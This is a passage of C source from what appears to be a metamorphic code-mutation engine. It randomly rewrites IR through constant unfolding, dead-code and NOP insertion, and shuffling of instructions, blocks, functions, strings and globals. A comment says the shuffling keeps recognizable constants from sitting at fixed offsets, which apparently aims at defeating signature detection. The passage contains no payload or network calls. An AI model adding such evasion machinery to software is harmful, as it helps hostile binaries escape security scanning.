        i = i - 1;
    }
    b = 0;
    while (b < func->block_count) {
        i = 0;
        while (i < func->blocks[b].instr_count) {
            ins = &func->blocks[b].instrs[i];
            if (ins->dest.kind == VK_TEMP) { ins->dest.index = perm[ins->dest.index]; }
            if (ins->src1.kind == VK_TEMP) { ins->src1.index = perm[ins->src1.index]; }
            if (ins->src2.kind == VK_TEMP) { ins->src2.index = perm[ins->src2.index]; }
            if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV
                || ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV
                || ins->opcode == OP_SYSCALL) {
                a = 0;
                while (a < ins->arg_count) {
                    if (ins->args[a].kind == VK_TEMP) { ins->args[a].index = perm[ins->args[a].index]; }
                    a = a + 1;
                }
            }
            i = i + 1;
        }
        b = b + 1;
    }
    free(perm);
}

void optimize_compact_temps(struct Function* func) {
    int* mapping;
    int b;
    int i;
    int a;
    int next;
    struct Block* blk;
    struct Instruction* ins;

    if (func->block_count == 0 || func->temp_count == 0) { return; }

    mapping = malloc(func->temp_count * 4);
    i = 0;
    while (i < func->temp_count) {
        mapping[i] = 0 - 1;
        i = i + 1;
    }

    // Mark all referenced temp indices
    b = 0;
    while (b < func->block_count) {
        blk = &func->blocks[b];
        i = 0;
        while (i < blk->instr_count) {
            ins = &blk->instrs[i];
            if (ins->dest.kind == VK_TEMP) { mapping[ins->dest.index] = 0; }
            if (ins->src1.kind == VK_TEMP) { mapping[ins->src1.index] = 0; }
            if (ins->src2.kind == VK_TEMP) { mapping[ins->src2.index] = 0; }
            if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV
                || ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV
                || ins->opcode == OP_SYSCALL) {
                a = 0;
                while (a < ins->arg_count) {
                    if (ins->args[a].kind == VK_TEMP) { mapping[ins->args[a].index] = 0; }
                    a = a + 1;
                }
            }
            i = i + 1;
        }
        b = b + 1;
    }

    // Assign contiguous indices
    next = 0;
    i = 0;
    while (i < func->temp_count) {
        if (mapping[i] == 0) {
            mapping[i] = next;
            next = next + 1;
        }
        i = i + 1;
    }

    // If nothing changed, skip rewrite
    if (next == func->temp_count) {
        free(mapping);
        return;
    }

    // Apply mapping to all operands
    b = 0;
    while (b < func->block_count) {
        blk = &func->blocks[b];
        i = 0;
        while (i < blk->instr_count) {
            ins = &blk->instrs[i];
            if (ins->dest.kind == VK_TEMP) { ins->dest.index = mapping[ins->dest.index]; }
            if (ins->src1.kind == VK_TEMP) { ins->src1.index = mapping[ins->src1.index]; }
            if (ins->src2.kind == VK_TEMP) { ins->src2.index = mapping[ins->src2.index]; }
            if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV
                || ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV
                || ins->opcode == OP_SYSCALL) {
                a = 0;
                while (a < ins->arg_count) {
                    if (ins->args[a].kind == VK_TEMP) { ins->args[a].index = mapping[ins->args[a].index]; }
                    a = a + 1;
                }
            }
            i = i + 1;
        }
        b = b + 1;
    }

    func->temp_count = next;
    free(mapping);
}

// Optimize: remove NOP instructions
void optimize_remove_nops(struct Function* func) {
    int b;
    int i;
    struct Block* blk;

    if (func->block_count == 0) { return; }

    b = 0;
    while (b < func->block_count) {
        blk = &func->blocks[b];
        i = blk->instr_count - 1;
        while (i >= 0) {
            if (blk->instrs[i].opcode == OP_NOP) {
                block_remove_instr(blk, i);
            }
            i = i - 1;
        }
        b = b + 1;
    }
}

// Apply all optimizations to module
void optimize_module() {
    int f;
    struct Function* func;
    int changed;
    int before;
    int after;
    int b;

    f = 0;
    while (f < g_mod->func_count) {
        func = &g_mod->funcs[f];
        if (func->block_count > 0) {
            // Loop until stable: removing dead code can expose more dead code
            changed = 1;
            while (changed != 0) {
                before = 0;
                b = 0;
                while (b < func->block_count) {
                    before = before + func->blocks[b].instr_count;
                    b = b + 1;
                }
                optimize_remove_nops(func);
                optimize_remove_dead_code(func);
                after = 0;
                b = 0;
                while (b < func->block_count) {
                    after = after + func->blocks[b].instr_count;
                    b = b + 1;
                }
                if (after < before) {
                    changed = 1;
                } else {
                    changed = 0;
                }
            }
            // Compact temp indices to close gaps from removed dead code
            optimize_compact_temps(func);
        }
        f = f + 1;
    }
}

// Apply optimizations stochastically (second pass after transforms).
// Each shrink pass runs with 50% probability so transforms partially survive.
// optimize_compact_temps always runs — required for codegen correctness.
void optimize_module_random() {
    int f;
    struct Function* func;
    int changed;
    int before;
    int after;
    int b;

    f = 0;
    while (f < g_mod->func_count) {
        func = &g_mod->funcs[f];
        if (func->block_count > 0) {
            changed = 1;
            while (changed != 0) {
                before = 0;
                b = 0;
                while (b < func->block_count) {
                    before = before + func->blocks[b].instr_count;
                    b = b + 1;
                }
                if (prng_range(2) != 0) { optimize_remove_nops(func); }
                if (prng_range(2) != 0) { optimize_remove_dead_code(func); }
                after = 0;
                b = 0;
                while (b < func->block_count) {
                    after = after + func->blocks[b].instr_count;
                    b = b + 1;
                }
                if (after < before) {
                    changed = 1;
                } else {
                    changed = 0;
                }
            }
            if (prng_range(2) != 0) { optimize_fold_constants(func); }
            optimize_compact_temps(func);
        }
        f = f + 1;
    }
}

// =============================================================================
// IR Transformations
// =============================================================================

// Transform: Constant unfolding
// Replace CONST with equivalent arithmetic: ADD, XOR, or SUB
void transform_unfold_constants(struct Function* func) {
    int temp_base;
    int b;
    int i;
    int val;
    int tc;
    int dest_kind;
    int dest_idx;
    int strategy;
    int a;
    int b_val;
    int t1;
    int t2;
    int r;
    int xored;
    struct Instruction* ni;

    if (func->block_count == 0) {
        return;
    }

    temp_base = func->temp_count;
    b = 0;
    while (b < func->block_count) {
        i = 0;
        while (i < func->blocks[b].instr_count) {
            if (func->blocks[b].instrs[i].opcode == OP_CONST && prng_range(100) < g_genome[GI_UNFOLD_CHANCE]) {
                val = func->blocks[b].instrs[i].src1.value;
                tc = func->blocks[b].instrs[i].type_code;
                dest_kind = func->blocks[b].instrs[i].dest.kind;
                dest_idx = func->blocks[b].instrs[i].dest.index;

                strategy = genome_pick(GI_UNFOLD_WEIGHTS, 4);

                if (strategy == 0 && val > 1) {
                    a = prng_range(val);
                    b_val = val - a;
                    t1 = temp_base;
                    temp_base = temp_base + 1;
                    t2 = temp_base;
                    temp_base = temp_base + 1;

                    ni = malloc(sizeof(struct Instruction) * 3);
                    init_instr(&ni[0], OP_CONST);
                    ni[0].dest.kind = VK_TEMP;
                    ni[0].dest.index = t1;
                    ni[0].src1.kind = VK_CONST;
                    ni[0].src1.value = a;
                    ni[0].type_code = tc;

                    init_instr(&ni[1], OP_CONST);
                    ni[1].dest.kind = VK_TEMP;
                    ni[1].dest.index = t2;
                    ni[1].src1.kind = VK_CONST;
                    ni[1].src1.value = b_val;
                    ni[1].type_code = tc;

                    init_instr(&ni[2], OP_ADD);
                    ni[2].dest.kind = dest_kind;
                    ni[2].dest.index = dest_idx;
                    ni[2].src1.kind = VK_TEMP;
                    ni[2].src1.index = t1;
                    ni[2].src2.kind = VK_TEMP;
                    ni[2].src2.index = t2;
                    ni[2].type_code = tc;

                    copy_instr(&func->blocks[b].instrs[i], &ni[0]);
                    block_insert_instrs(&func->blocks[b], i + 1, &ni[1], 2);
                    free(ni);
                    i = i + 3;
                } else if (strategy == 1 && val != 0) {
                    r = prng_range(32767) + 1;
                    xored = val ^ r;
                    t1 = temp_base;
                    temp_base = temp_base + 1;
                    t2 = temp_base;
                    temp_base = temp_base + 1;

                    ni = malloc(sizeof(struct Instruction) * 3);
                    init_instr(&ni[0], OP_CONST);
                    ni[0].dest.kind = VK_TEMP;
                    ni[0].dest.index = t1;
                    ni[0].src1.kind = VK_CONST;
                    ni[0].src1.value = xored;
                    ni[0].type_code = tc;

                    init_instr(&ni[1], OP_CONST);
                    ni[1].dest.kind = VK_TEMP;
                    ni[1].dest.index = t2;
                    ni[1].src1.kind = VK_CONST;
                    ni[1].src1.value = r;
                    ni[1].type_code = tc;

                    init_instr(&ni[2], OP_XOR);
                    ni[2].dest.kind = dest_kind;
                    ni[2].dest.index = dest_idx;
                    ni[2].src1.kind = VK_TEMP;
                    ni[2].src1.index = t1;
                    ni[2].src2.kind = VK_TEMP;
                    ni[2].src2.index = t2;
                    ni[2].type_code = tc;

                    copy_instr(&func->blocks[b].instrs[i], &ni[0]);
                    block_insert_instrs(&func->blocks[b], i + 1, &ni[1], 2);
                    free(ni);
                    i = i + 3;
                } else if (strategy == 2) {
                    r = prng_range(100) + 1;
                    t1 = temp_base;
                    temp_base = temp_base + 1;
                    t2 = temp_base;
                    temp_base = temp_base + 1;

                    ni = malloc(sizeof(struct Instruction) * 3);
                    init_instr(&ni[0], OP_CONST);
                    ni[0].dest.kind = VK_TEMP;
                    ni[0].dest.index = t1;
                    ni[0].src1.kind = VK_CONST;
                    ni[0].src1.value = val + r;
                    ni[0].type_code = tc;

                    init_instr(&ni[1], OP_CONST);
                    ni[1].dest.kind = VK_TEMP;
                    ni[1].dest.index = t2;
                    ni[1].src1.kind = VK_CONST;
                    ni[1].src1.value = r;
                    ni[1].type_code = tc;

                    init_instr(&ni[2], OP_SUB);
                    ni[2].dest.kind = dest_kind;
                    ni[2].dest.index = dest_idx;
                    ni[2].src1.kind = VK_TEMP;
                    ni[2].src1.index = t1;
                    ni[2].src2.kind = VK_TEMP;
                    ni[2].src2.index = t2;
                    ni[2].type_code = tc;

                    copy_instr(&func->blocks[b].instrs[i], &ni[0]);
                    block_insert_instrs(&func->blocks[b], i + 1, &ni[1], 2);
                    free(ni);
                    i = i + 3;
                } else {
                    i = i + 1;
                }
            } else {
                i = i + 1;
            }
        }
        b = b + 1;
    }
    func->temp_count = temp_base;
}

// Transform: Instruction substitution
// ADD <-> SUB with negated const, MUL by power-of-2 -> SHL
void transform_substitute_instrs(struct Function* func) {
    int b;
    int i;
    int val;
    int shift;

    if (func->block_count == 0) {
        return;
    }

    b = 0;
    while (b < func->block_count) {
        i = 0;
        while (i < func->blocks[b].instr_count) {
            if (prng_range(100) < g_genome[GI_SUBSTITUTE_CHANCE]) {
                if (func->blocks[b].instrs[i].opcode == OP_ADD && func->blocks[b].instrs[i].src2.kind == VK_CONST) {
                    func->blocks[b].instrs[i].opcode = OP_SUB;
                    func->blocks[b].instrs[i].src2.value = 0 - func->blocks[b].instrs[i].src2.value;
                } else if (func->blocks[b].instrs[i].opcode == OP_SUB && func->blocks[b].instrs[i].src2.kind == VK_CONST) {
                    func->blocks[b].instrs[i].opcode = OP_ADD;
                    func->blocks[b].instrs[i].src2.value = 0 - func->blocks[b].instrs[i].src2.value;
                } else if (func->blocks[b].instrs[i].opcode == OP_MUL && func->blocks[b].instrs[i].src2.kind == VK_CONST) {
                    val = func->blocks[b].instrs[i].src2.value;
                    if (val > 0 && (val & (val - 1)) == 0) {
                        shift = 0;
                        while ((1 << shift) < val) {
                            shift = shift + 1;
                        }
                        func->blocks[b].instrs[i].opcode = OP_SHL;
                        func->blocks[b].instrs[i].src2.value = shift;
                    }
                }
            }
            i = i + 1;
        }
        b = b + 1;
    }
}

// Transform: Dead code insertion
void transform_insert_dead_code(struct Function* func) {
    int temp_base;
    int b;
    int i;
    int kind;
    int count;
    int t1;
    int t2;
    int t3;
    struct Instruction* ni;

    if (func->block_count == 0) {
        return;
    }

    temp_base = func->temp_count;
    b = 0;
    while (b < func->block_count) {
        i = 0;
        while (i < func->blocks[b].instr_count) {
            if (prng_range(100) < g_genome[GI_DEAD_CODE_CHANCE]) {
                kind = genome_pick(GI_DEAD_CODE_WEIGHTS, 4);
                count = 0;

                if (kind == 0) {
                    t1 = temp_base;
                    temp_base = temp_base + 1;
                    ni = malloc(sizeof(struct Instruction) * 1);
                    init_instr(&ni[0], OP_CONST);
                    ni[0].dest.kind = VK_TEMP;
                    ni[0].dest.index = t1;
                    ni[0].src1.kind = VK_CONST;
                    ni[0].src1.value = prng_range(1000);
                    ni[0].type_code = TC_I32;
                    count = 1;
                } else if (kind == 1) {
                    t1 = temp_base;
                    temp_base = temp_base + 1;
                    t2 = temp_base;
                    temp_base = temp_base + 1;
                    t3 = temp_base;
                    temp_base = temp_base + 1;
                    ni = malloc(sizeof(struct Instruction) * 3);
                    init_instr(&ni[0], OP_CONST);
                    ni[0].dest.kind = VK_TEMP;
                    ni[0].dest.index = t1;
                    ni[0].src1.kind = VK_CONST;
                    ni[0].src1.value = prng_range(100);
                    ni[0].type_code = TC_I32;
                    init_instr(&ni[1], OP_CONST);
                    ni[1].dest.kind = VK_TEMP;
                    ni[1].dest.index = t2;
                    ni[1].src1.kind = VK_CONST;
                    ni[1].src1.value = prng_range(100);
                    ni[1].type_code = TC_I32;
                    init_instr(&ni[2], OP_ADD);
                    ni[2].dest.kind = VK_TEMP;
                    ni[2].dest.index = t3;
                    ni[2].src1.kind = VK_TEMP;
                    ni[2].src1.index = t1;
                    ni[2].src2.kind = VK_TEMP;
                    ni[2].src2.index = t2;
                    ni[2].type_code = TC_I32;
                    count = 3;
                } else if (kind == 2) {
                    t1 = temp_base;
                    temp_base = temp_base + 1;
                    t2 = temp_base;
                    temp_base = temp_base + 1;
                    ni = malloc(sizeof(struct Instruction) * 2);
                    init_instr(&ni[0], OP_CONST);
                    ni[0].dest.kind = VK_TEMP;
                    ni[0].dest.index = t1;
                    ni[0].src1.kind = VK_CONST;
                    ni[0].src1.value = prng_range(65535);
                    ni[0].type_code = TC_I32;
                    init_instr(&ni[1], OP_XOR);
                    ni[1].dest.kind = VK_TEMP;
                    ni[1].dest.index = t2;
                    ni[1].src1.kind = VK_TEMP;
                    ni[1].src1.index = t1;
                    ni[1].src2.kind = VK_TEMP;
                    ni[1].src2.index = t1;
                    ni[1].type_code = TC_I32;
                    count = 2;
                } else {
                    t1 = temp_base;
                    temp_base = temp_base + 1;
                    t2 = temp_base;
                    temp_base = temp_base + 1;
                    ni = malloc(sizeof(struct Instruction) * 2);
                    init_instr(&ni[0], OP_CONST);
                    ni[0].dest.kind = VK_TEMP;
                    ni[0].dest.index = t1;
                    ni[0].src1.kind = VK_CONST;
                    ni[0].src1.value = prng_range(500);
                    ni[0].type_code = TC_I32;
                    init_instr(&ni[1], OP_COPY);
                    ni[1].dest.kind = VK_TEMP;
                    ni[1].dest.index = t2;
                    ni[1].src1.kind = VK_TEMP;
                    ni[1].src1.index = t1;
                    ni[1].type_code = TC_I32;
                    count = 2;
                }

                if (count > 0) {
                    block_insert_instrs(&func->blocks[b], i, ni, count);
                    free(ni);
                    i = i + count;
                }
            }
            i = i + 1;
        }
        b = b + 1;
    }
    func->temp_count = temp_base;
}

// Transform: NOP insertion
void transform_insert_nops(struct Function* func) {
    int b;
    int i;
    int nop_count;
    int j;
    struct Instruction* nops;

    if (func->block_count == 0) {
        return;
    }

    b = 0;
    while (b < func->block_count) {
        i = 0;
        while (i < func->blocks[b].instr_count) {
            if (prng_range(100) < g_genome[GI_NOP_CHANCE]) {
                nop_count = prng_range(g_genome[GI_NOP_MAX_COUNT]) + 1;
                nops = malloc(sizeof(struct Instruction) * nop_count);
                j = 0;
                while (j < nop_count) {
                    init_instr(&nops[j], OP_NOP);
                    j = j + 1;
                }
                block_insert_instrs(&func->blocks[b], i, nops, nop_count);
                free(nops);
                i = i + nop_count;
            }
            i = i + 1;
        }
        b = b + 1;
    }
}

// Instruction scheduling: check if instruction has side effects
int has_side_effects(struct Instruction* ins) {
    if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV
        || ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV
        || ins->opcode == OP_SYSCALL
        || ins->opcode == OP_STORE || ins->opcode == OP_ALLOCA) {
        return 1;
    }
    return 0;
}

int is_memory_op(struct Instruction* ins) {
    if (ins->opcode == OP_LOAD || ins->opcode == OP_STORE
        || ins->opcode == OP_CALL || ins->opcode == OP_CALLV
        || ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV
        || ins->opcode == OP_SYSCALL) {
        return 1;
    }
    return 0;
}

int is_terminator(struct Instruction* ins) {
    if (ins->opcode == OP_JMP || ins->opcode == OP_JZ || ins->opcode == OP_JNZ
        || ins->opcode == OP_RET || ins->opcode == OP_RETV) {
        return 1;
    }
    return 0;
}

// Collect VK_TEMP indices read by an instruction
int collect_reads(struct Instruction* ins, int* reads) {
    int n;
    int a;
    n = 0;
    if (ins->src1.kind == VK_TEMP) { reads[n] = ins->src1.index; n = n + 1; }
    if (ins->src2.kind == VK_TEMP) { reads[n] = ins->src2.index; n = n + 1; }
    if (ins->opcode == OP_STORE && ins->dest.kind == VK_TEMP) { reads[n] = ins->dest.index; n = n + 1; }
    if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV
        || ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV
        || ins->opcode == OP_SYSCALL) {
        a = 0;
        while (a < ins->arg_count) {
            if (ins->args[a].kind == VK_TEMP) { reads[n] = ins->args[a].index; n = n + 1; }
            a = a + 1;
        }
    }
    return n;
}

int are_independent(struct Instruction* a, struct Instruction* b) {
    int a_writes; int b_writes;
    int a_reads[32]; int b_reads[32];
    int a_rc; int b_rc;
    int i;
    int a_lw; int b_lw;

    if (has_side_effects(a) && has_side_effects(b)) { return 0; }
    if (is_memory_op(a) && is_memory_op(b)) { return 0; }

    a_writes = -1;
    if (a->dest.kind == VK_TEMP && a->opcode != OP_STORE) { a_writes = a->dest.index; }
    b_writes = -1;
    if (b->dest.kind == VK_TEMP && b->opcode != OP_STORE) { b_writes = b->dest.index; }

    a_rc = collect_reads(a, a_reads);
    b_rc = collect_reads(b, b_reads);

    // RAW
    if (a_writes >= 0) {
        i = 0;
        while (i < b_rc) {
            if (b_reads[i] == a_writes) { return 0; }
            i = i + 1;
        }
    }
    // WAR
    if (b_writes >= 0) {
        i = 0;
        while (i < a_rc) {
            if (a_reads[i] == b_writes) { return 0; }
            i = i + 1;
        }
    }
    // WAW
    if (a_writes >= 0 && a_writes == b_writes) { return 0; }

    // VK_LOCAL: STORE writes through dest (kind==VK_LOCAL); LOAD reads through src1 (kind==VK_LOCAL)
    a_lw = -1;
    if (a->opcode == OP_STORE && a->dest.kind == VK_LOCAL) { a_lw = a->dest.index; }
    b_lw = -1;
    if (b->opcode == OP_STORE && b->dest.kind == VK_LOCAL) { b_lw = b->dest.index; }
    // RAW: a stores to local that b reads
    if (a_lw >= 0) {
        if (b->src1.kind == VK_LOCAL && b->src1.index == a_lw) { return 0; }
        if (b->src2.kind == VK_LOCAL && b->src2.index == a_lw) { return 0; }
    }
    // WAR: b stores to local that a reads
    if (b_lw >= 0) {
        if (a->src1.kind == VK_LOCAL && a->src1.index == b_lw) { return 0; }
        if (a->src2.kind == VK_LOCAL && a->src2.index == b_lw) { return 0; }
    }
    // WAW: both store to same local
    if (a_lw >= 0 && a_lw == b_lw) { return 0; }

    return 1;
}

void transform_reorder_instrs(struct Function* func) {
    int b; int n; int attempts; int att; int pos;
    struct Instruction* tmp;

    b = 0;
    while (b < func->block_count) {
        n = func->blocks[b].instr_count;
        if (n > 2) {
            attempts = g_genome[GI_REORDER_INSTRS_INTENSITY] * n;
            att = 0;
            while (att < attempts) {
                pos = prng_range(n - 1);
                if (is_terminator(&func->blocks[b].instrs[pos]) == 0
                    && is_terminator(&func->blocks[b].instrs[pos + 1]) == 0) {
                    if (are_independent(&func->blocks[b].instrs[pos], &func->blocks[b].instrs[pos + 1])) {
                        tmp = malloc(sizeof(struct Instruction));
                        copy_instr(tmp, &func->blocks[b].instrs[pos]);
                        copy_instr(&func->blocks[b].instrs[pos], &func->blocks[b].instrs[pos + 1]);
                        copy_instr(&func->blocks[b].instrs[pos + 1], tmp);
                        free(tmp);
                    }
                }
                att = att + 1;
            }
        }
        b = b + 1;
    }
}

// Local variable reordering
void transform_reorder_locals(struct Function* func) {
    int lc; int i; int j; int tmp; int b; int a;
    int* perm; int* new_types; int* new_sizes;
    struct Instruction* ins;

    if (prng_range(100) >= g_genome[GI_REORDER_LOCALS_CHANCE]) { return; }
    lc = func->local_count;
    if (lc <= 1) { return; }

    // Fisher-Yates shuffle
    perm = malloc(lc * 4);
    i = 0;
    while (i < lc) {
        perm[i] = i;
        i = i + 1;
    }
    i = lc - 1;
    while (i > 0) {
        j = prng_range(i + 1);
        tmp = perm[i]; perm[i] = perm[j]; perm[j] = tmp;
        i = i - 1;
    }

    // Remap VK_LOCAL operands
    b = 0;
    while (b < func->block_count) {
        i = 0;
        while (i < func->blocks[b].instr_count) {
            ins = &func->blocks[b].instrs[i];
            if (ins->dest.kind == VK_LOCAL) { ins->dest.index = perm[ins->dest.index]; }
            if (ins->src1.kind == VK_LOCAL) { ins->src1.index = perm[ins->src1.index]; }
            if (ins->src2.kind == VK_LOCAL) { ins->src2.index = perm[ins->src2.index]; }
            if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV
                || ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV
                || ins->opcode == OP_SYSCALL) {
                a = 0;
                while (a < ins->arg_count) {
                    if (ins->args[a].kind == VK_LOCAL) { ins->args[a].index = perm[ins->args[a].index]; }
                    a = a + 1;
                }
            }
            i = i + 1;
        }
        b = b + 1;
    }

    // Rearrange local_types[] and local_sizes[]
    new_types = malloc(lc * 4);
    new_sizes = malloc(lc * 4);
    i = 0;
    while (i < lc) {
        new_types[perm[i]] = func->local_types[i];
        new_sizes[perm[i]] = func->local_sizes[i];
        i = i + 1;
    }
    // Copy back
    i = 0;
    while (i < lc) {
        func->local_types[i] = new_types[i];
        func->local_sizes[i] = new_sizes[i];
        i = i + 1;
    }
    free(new_types);
    free(new_sizes);
    free(perm);
}

void transform_reorder_blocks(struct Function* func) {
    int n; int b; int i; int last_op; int j; int tmp;
    int* perm; int* new_idx;
    struct Block* new_blocks;
    struct Instruction jmp;

    if (prng_range(100) >= g_genome[GI_REORDER_BLOCKS_CHANCE]) { return; }
    n = func->block_count;
    if (n <= 2) return;

    // Step 1: Add explicit JMPs for fall-through
    b = 0;
    while (b < n - 1) {
        if (func->blocks[b].instr_count == 0) {
            init_instr(&jmp, OP_JMP);
            jmp.target_block = b + 1;
            block_insert_instrs(&func->blocks[b], 0, &jmp, 1);
        } else {
            last_op = func->blocks[b].instrs[func->blocks[b].instr_count - 1].opcode;
            if (last_op != OP_JMP && last_op != OP_RET && last_op != OP_RETV) {
                init_instr(&jmp, OP_JMP);
                jmp.target_block = b + 1;
                block_insert_instrs(&func->blocks[b], func->blocks[b].instr_count, &jmp, 1);
            }
        }
        b = b + 1;
    }

    // Step 2: Fisher-Yates shuffle of indices 1..N-1
    perm = malloc(sizeof(int) * n);
    i = 0;
    while (i < n) {
        perm[i] = i;
        i = i + 1;
    }
    i = n - 1;
    while (i > 1) {
        j = 1 + prng_range(i);  // j in [1, i]
        tmp = perm[i]; perm[i] = perm[j]; perm[j] = tmp;
        i = i - 1;
    }

    // Step 3: Build reverse mapping
    new_idx = malloc(sizeof(int) * n);
    i = 0;
    while (i < n) {
        new_idx[perm[i]] = i;
        i = i + 1;
    }

    // Step 4: Update all jump targets
    b = 0;
    while (b < n) {
        i = 0;
        while (i < func->blocks[b].instr_count) {
            if (func->blocks[b].instrs[i].opcode == OP_JMP
                || func->blocks[b].instrs[i].opcode == OP_JZ
                || func->blocks[b].instrs[i].opcode == OP_JNZ) {
                func->blocks[b].instrs[i].target_block = new_idx[func->blocks[b].instrs[i].target_block];
            }
            i = i + 1;
        }
        b = b + 1;
    }

    // Step 5: Rearrange blocks
    new_blocks = malloc(sizeof(struct Block) * n);
    i = 0;
    while (i < n) {
        new_blocks[i].label = func->blocks[perm[i]].label;
        new_blocks[i].instrs = func->blocks[perm[i]].instrs;
        new_blocks[i].instr_count = func->blocks[perm[i]].instr_count;
        i = i + 1;
    }
    // Copy back
    i = 0;
    while (i < n) {
        func->blocks[i].label = new_blocks[i].label;
        func->blocks[i].instrs = new_blocks[i].instrs;
        func->blocks[i].instr_count = new_blocks[i].instr_count;
        i = i + 1;
    }
    free(new_blocks);
    free(perm);
    free(new_idx);
}

void transform_reorder_funcs() {
    int n; int i; int j; int tmp;
    int* perm; int* inv;
    struct Function* new_funcs;
    struct Global* new_globals;
    int f; int b; int k;
    struct Instruction* ins;
    char* ts;

    if (prng_range(100) >= g_genome[GI_REORDER_FUNCS_CHANCE]) { return; }
    n = g_mod->func_count;
    if (n <= 1) { return; }

    // Fisher-Yates shuffle of ALL functions (including externs)
    perm = malloc(sizeof(int) * n);
    i = 0;
    while (i < n) { perm[i] = i; i = i + 1; }
    i = n - 1;
    while (i > 0) {
        j = prng_range(i + 1);
        tmp = perm[i]; perm[i] = perm[j]; perm[j] = tmp;
        i = i - 1;
    }

    // Build inverse: inv[old_idx] = new_idx
    inv = malloc(sizeof(int) * n);
    i = 0;
    while (i < n) { inv[perm[i]] = i; i = i + 1; }

    // Apply shuffle
    new_funcs = malloc(sizeof(struct Function) * n);
    i = 0;
    while (i < n) {
        copy_func(&new_funcs[i], &g_mod->funcs[perm[i]]);
        i = i + 1;
    }
    free(g_mod->funcs);
    g_mod->funcs = new_funcs;

    // Update entry_func index
    g_mod->entry_func = inv[g_mod->entry_func];

    // Patch all CALL/CALLV func_idx references
    f = 0;
    while (f < n) {
        if (g_mod->funcs[f].block_count > 0) {
            b = 0;
            while (b < g_mod->funcs[f].block_count) {
                k = 0;
                while (k < g_mod->funcs[f].blocks[b].instr_count) {
                    ins = &g_mod->funcs[f].blocks[b].instrs[k];
                    if (ins->opcode == OP_CALL || ins->opcode == OP_CALLV) {
                        ins->func_idx = inv[ins->func_idx];
                    }
                    k = k + 1;
                }
                b = b + 1;
            }
        }
        f = f + 1;
    }

    free(perm);
    free(inv);

    // Rotate string table (skip index 0: dll_idx=0 is "no DLL" sentinel)
    n = g_mod->string_count;
    if (n > 2) {
        tmp = 1 + prng_range(n - 2);
        // Triple-reverse left rotation by tmp on strings[1..n-1]
        // Step 1: reverse [1..tmp]
        i = 1; j = tmp;
        while (i < j) { ts = g_mod->strings[i]; g_mod->strings[i] = g_mod->strings[j]; g_mod->strings[j] = ts; i = i + 1; j = j - 1; }
        // Step 2: reverse [tmp+1..n-1]
        i = tmp + 1; j = n - 1;
        while (i < j) { ts = g_mod->strings[i]; g_mod->strings[i] = g_mod->strings[j]; g_mod->strings[j] = ts; i = i + 1; j = j - 1; }
        // Step 3: reverse [1..n-1]
        i = 1; j = n - 1;
        while (i < j) { ts = g_mod->strings[i]; g_mod->strings[i] = g_mod->strings[j]; g_mod->strings[j] = ts; i = i + 1; j = j - 1; }
        f = 0;
        while (f < g_mod->func_count) {
            if (g_mod->funcs[f].name_idx > 0) { g_mod->funcs[f].name_idx = ((g_mod->funcs[f].name_idx - 1 + n - 1 - tmp) % (n - 1)) + 1; }
            if (g_mod->funcs[f].dll_idx > 0) { g_mod->funcs[f].dll_idx = ((g_mod->funcs[f].dll_idx - 1 + n - 1 - tmp) % (n - 1)) + 1; }
            f = f + 1;
        }
        f = 0;
        while (f < g_mod->global_count) {
            if (g_mod->globals[f].name_idx > 0) { g_mod->globals[f].name_idx = ((g_mod->globals[f].name_idx - 1 + n - 1 - tmp) % (n - 1)) + 1; }
            if (g_mod->globals[f].init_kind == 2 && g_mod->globals[f].init_value > 0) { g_mod->globals[f].init_value = ((g_mod->globals[f].init_value - 1 + n - 1 - tmp) % (n - 1)) + 1; }
            f = f + 1;
        }
        // Remap VK_STRING operand indices in all instructions
        f = 0;
        while (f < g_mod->func_count) {
            if (g_mod->funcs[f].block_count > 0) {
                b = 0;
                while (b < g_mod->funcs[f].block_count) {
                    k = 0;
                    while (k < g_mod->funcs[f].blocks[b].instr_count) {
                        ins = &g_mod->funcs[f].blocks[b].instrs[k];
                        if (ins->dest.kind == VK_STRING && ins->dest.index > 0) { ins->dest.index = ((ins->dest.index - 1 + n - 1 - tmp) % (n - 1)) + 1; }
                        if (ins->src1.kind == VK_STRING && ins->src1.index > 0) { ins->src1.index = ((ins->src1.index - 1 + n - 1 - tmp) % (n - 1)) + 1; }
                        if (ins->src2.kind == VK_STRING && ins->src2.index > 0) { ins->src2.index = ((ins->src2.index - 1 + n - 1 - tmp) % (n - 1)) + 1; }
                        i = 0;
                        while (i < ins->arg_count) {
                            if (ins->args[i].kind == VK_STRING && ins->args[i].index > 0) { ins->args[i].index = ((ins->args[i].index - 1 + n - 1 - tmp) % (n - 1)) + 1; }
                            i = i + 1;
                        }
                        k = k + 1;
                    }
                    b = b + 1;
                }
            }
            f = f + 1;
        }
    }

    // Shuffle the globals[] array so recognizable small-int initializer
    // sequences (GI_* constants, magic numbers) don't sit at a deterministic
    // offset in .data. Same Fisher-Yates pattern as functions above; remaps
    // every VK_GLOBAL operand. g_bundle_header etc. are looked up by name,
    // so shuffling is safe wrt auto-embed.
    n = g_mod->global_count;
    if (n > 1) {
        perm = malloc(sizeof(int) * n);
        i = 0;
        while (i < n) { perm[i] = i; i = i + 1; }
        i = n - 1;
        while (i > 0) {
            j = prng_range(i + 1);
            tmp = perm[i]; perm[i] = perm[j]; perm[j] = tmp;
            i = i - 1;
        }
        // perm[i] = new position of element originally at i
        new_globals = malloc(sizeof(struct Global) * n);
        i = 0;
        while (i < n) {
            new_globals[perm[i]].name       = g_mod->globals[i].name;
            new_globals[perm[i]].name_idx   = g_mod->globals[i].name_idx;
            new_globals[perm[i]].type_code  = g_mod->globals[i].type_code;
            new_globals[perm[i]].size       = g_mod->globals[i].size;
            new_globals[perm[i]].init_kind  = g_mod->globals[i].init_kind;
            new_globals[perm[i]].init_value = g_mod->globals[i].init_value;
            i = i + 1;
        }
        free(g_mod->globals);
        g_mod->globals = new_globals;
        // Remap VK_GLOBAL operands in all instructions
        f = 0;
        while (f < g_mod->func_count) {
            if (g_mod->funcs[f].block_count > 0) {
                b = 0;
                while (b < g_mod->funcs[f].block_count) {
                    k = 0;
